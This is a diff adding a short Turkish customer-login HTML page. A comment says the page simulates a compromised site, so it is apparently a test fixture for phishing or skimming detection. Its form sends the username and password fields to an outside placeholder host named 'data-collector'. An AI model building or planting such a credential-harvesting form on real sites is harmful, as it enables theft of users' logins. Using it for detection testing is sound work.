@@ -1,0 +1,23 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<title>Hesabınıza Giriş Yapın</title>
+<meta name="description" content="Güvenli müşteri girişi">
+</head>
+<body>
+<h1>Müşteri Girişi</h1>
+<p>Devam etmek için bilgilerinizi girin.</p>
+
+<!-- Form action farklı bir domain'e gidiyor - sızmış site simülasyonu -->
+<form action="https://data-collector-test.example.net/submit" method="POST">
+  <label>Kullanıcı Adı:</label><br>
+  <input type="text" name="username"><br><br>
+  <label>Şifre:</label><br>
+  <input type="password" name="password"><br><br>
+  <button type="submit">Giriş Yap</button>
+</form>
+
+</body>
+</html>
